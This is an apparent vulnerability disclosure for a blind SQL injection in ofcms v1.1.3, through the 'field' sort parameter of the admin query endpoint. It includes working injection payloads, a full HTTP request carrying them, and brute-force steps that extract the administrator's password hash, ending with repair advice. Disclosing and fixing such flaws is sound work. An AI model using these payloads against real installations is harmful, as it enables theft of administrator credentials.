## Vulnerability Description

The `ComnController` component in `ofcms v1.1.3` contains an SQL injection vulnerability when using the `query()` method to handle general query requests. This vulnerability stems from improper validation of the `field` parameter. Because this parameter is directly appended to the `ORDER BY` clause of the backend SQL, attackers can perform blind SQL injection by constructing complex SQL expressions (including nested subqueries and Boolean logic).

## Vulnerability Analysis


The vulnerability's entry point class file is: ofcms-admin\src\main\java\com\ofsoft\cms\admin\controller\ComnController.java

Line 33, `Db.getSqlPara(params.get("sqlid").toString(), params);`, will call the SQL query statement in the `query` section of the file `ofcms-admin\src\main\resources\conf\sql\system\user.sql` as long as `sqlid` = `system.user.query`.

<img width="1359" height="716" alt="Pasted image 20260506224503" src="https://github.com/user-attachments/assets/a84ec3c4-9c88-49f5-8806-717fadb315ac" />


sql file: ofcms-admin\src\main\resources\conf\sql\system\user.sql

The content is as follows: as long as the values ​​of sort and field are not empty, they will be directly concatenated into the SQL query.

<img width="1772" height="565" alt="Pasted image 20260506224829" src="https://github.com/user-attachments/assets/9285b620-3299-4752-a53d-1eabe682316c" />



The vulnerability's entry point class file is: ofcms-admin\src\main\java\com\ofsoft\cms\admin\controller\ComnController.java

The fields and sort in line 34 are controllable by us, therefore an SQL injection vulnerability exists.

<img width="1398" height="732" alt="Pasted image 20260506224958" src="https://github.com/user-attachments/assets/f871c79b-e15a-4972-8674-f7703bcfeed1" />


## Vulnerability Reproduction

数据库中包含一个 user_id=1 的管理员用户。通过读取该用户的密码（user_password），我们可以证明存在 SQL 注入漏洞。

<img width="1897" height="783" alt="Pasted image 20260506225308" src="https://github.com/user-attachments/assets/980079c4-0387-4350-97f1-55260b312e7c" />



First, log in to the backend, obtain the cookie after login, and then set the following payload:

field=if(LeNgth((select/**/user_password/**/from/**/of_sys_user/**/where/**/user_id=1))=X,u.user_id,(select/**/1/**/union/**/select/**/2))

Iterate through the values ​​of X. If X equals the correct password length, respond with a 200; otherwise, respond with a 500.

Based on the website's routing, the request packets are configured as follows:

```http
POST /ofcms_admin/admin/comn/service/query.json HTTP/1.1
Host: localhost:8080
Accept: application/json, text/javascript, */*; q=0.01
Cookie: JSESSIONID=FA43B7C3EC0D35ECE095C001C4D2A70C
sec-ch-ua-platform: "Windows"
Origin: http://localhost:8080
X-Requested-With: XMLHttpRequest
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Referer: http://localhost:8080/ofcms_admin/admin/f.html?p=system/user/index.html
sec-ch-ua-mobile: ?0
sec-ch-ua: "Google Chrome";v="147", "Not.A/Brand";v="8", "Chromium";v="147"
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Sec-Fetch-Site: same-origin
Accept-Encoding: gzip, deflate, br, zstd
Accept-Language: zh-CN,zh;q=0.9
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36
Content-Length: 194

sqlid=system.user.query&pageNum=1&pageSize=10&field=if(LeNgth((select/**/user_password/**/from/**/of_sys_user/**/where/**/user_id=1))=X,u.user_id,(select/**/1/**/union/**/select/**/2))&sort=asc
```

In the brute-force module of bp, iterate through the values ​​of X, from 1 to 250.

<img width="1920" height="1003" alt="Pasted image 20260506225807" src="https://github.com/user-attachments/assets/c1ec61c8-4357-4d97-ae7c-a7c0b03dd8ed" />


The administrator password obtained through injection is 64 characters long.

<img width="1869" height="989" alt="Pasted image 20260506225853" src="https://github.com/user-attachments/assets/627d18a4-09f1-4aa0-b918-62c8b132bf9f" />


The password for the administrator user (user_id=1) can be obtained through the `admin/system/user/getData.json` interface. Calculations show that its length is 64 characters.

<img width="1920" height="747" alt="Pasted image 20260506230128" src="https://github.com/user-attachments/assets/ecbaff81-21c5-4a3e-87f9-e6e364dda09a" />



Now we begin the injection, obtaining the password value, and setting up the following injection statement:field=if((select/**/ascii(substr(user_password,X,1))/**/from/**/of_sys_user/**/where/**/user_id=1)=Y,u.user_id,(select/**/1/**/union/**/select/**/2))

Traversing length X: 1-10 (because brute-forcing 1-64 would be too large, for demonstration purposes I'll only read the first 10 characters of the password) 

Traversing ASCII code Y: 1-255

The bp brute-force module is configured as follows:

<img width="1897" height="859" alt="Pasted image 20260506230933" src="https://github.com/user-attachments/assets/410b1020-9e68-400d-a1dd-75987d74173a" />



Explosion result conversion:8d969eef6e

|**位置 (Payload 1)**|**ASCII 码 (Payload 2)**|**对应字符**|
|---|---|---|
|1|56|**8**|
|2|100|**d**|
|3|57|**9**|
|4|54|**6**|
|5|57|**9**|
|6|101|**e**|
|7|101|**e**|
|8|102|**f**|
|9|54|**6**|
|10|101|**e**|

<img width="1908" height="934" alt="Pasted image 20260506231804" src="https://github.com/user-attachments/assets/745d89da-e123-4449-9890-dd2dbe2da393" />


The brute-force password for the admin user above, consisting of the first 10 characters, is: 8d969eef6e. However, the password for the admin user in the database is: 8d969eef6ecad3c29a3a629280e686cf0c3f5d5a86aff3ca12020c923adc6c92. The brute-force result perfectly matches the first 10 characters of the admin user's password in the database. The SQL injection vulnerability has been successfully reproduced, and its existence has been verified.

<img width="1503" height="670" alt="Pasted image 20260506232248" src="https://github.com/user-attachments/assets/da13ba1f-e063-4bdc-b681-f984d75d92cb" />


## Repair suggestions

1. Filter user input data.

2. Set a whitelist, defining a list of fields that can be sorted. Only fields within this list are allowed to be appended to the SQL statement.


